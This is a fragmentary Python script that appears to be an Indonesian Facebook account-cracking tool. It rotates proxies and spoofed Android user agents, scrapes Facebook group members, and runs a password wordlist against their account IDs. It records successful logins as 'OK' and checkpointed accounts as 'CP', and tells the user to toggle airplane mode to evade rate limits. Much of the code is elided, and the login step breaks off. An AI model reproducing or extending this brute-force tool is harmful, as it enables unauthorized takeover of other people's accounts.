...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mRian_Ardyansyah_xy')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Pro/'
	...
	aa='Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Pro'
...
def grup():
	...
	ua = 'Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36'
	miskinlu = {"user-agent": ua}
	url = "https://mbasic.facebook.com/groups/"
	ses = requests.Session()
	try:
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} Sedang menunggu Janda {m}•{k}•{h}•{x} <<<<< ')
	print('')
	print(f'>> Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
	print(f'>> Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
	print(f'>> Mainkan Mode Pesawat Jika Tidak ada isi {m}{x} \n')
...
def crack(idf,pwv):
	...
	ua = 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]'
	ua2 = 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]'
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
